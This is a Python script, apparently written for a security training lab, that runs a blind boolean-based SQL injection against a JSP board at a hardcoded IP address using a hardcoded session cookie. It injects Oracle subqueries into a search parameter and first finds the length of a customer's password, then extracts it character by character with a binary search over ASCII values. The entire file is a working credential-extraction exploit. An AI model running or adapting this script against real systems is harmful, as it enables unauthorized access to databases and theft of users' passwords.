import requests
import time

url = "http://3.36.127.85:8000/SQL3/board.jsp"
cookie = {'JSESSIONID': '6539B47081BDBCB23CDC83A6C4BF7CF0'}

def find_length():
    pwlength = 1

    while True:
        param = {"search": "dd' AND (SELECT LENGTH(PASSWORD) AS password_length FROM (SELECT PASSWORD, ROWNUM AS rnum FROM customer WHERE ROWNUM <= 100) WHERE RNUM=2)={} --".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "mas9623" in req.text:
            return pwlength
        else:
            print(param)
            pwlength += 1
        time.sleep(0.1) # 타임슬립 추가

def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {"search": "dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=2),{},1))={} --".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "mas9623" in req.text:
                password += chr(value)
                break
            else:
                param = {"search": "dd' AND ASCII(SUBSTR((SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM AS RNUM FROM CUSTOMER) WHERE RNUM=2),{},1))>{} --".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "mas9623" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
            time.sleep(0.1)
    print("비밀번호는: ", password)

find_pw()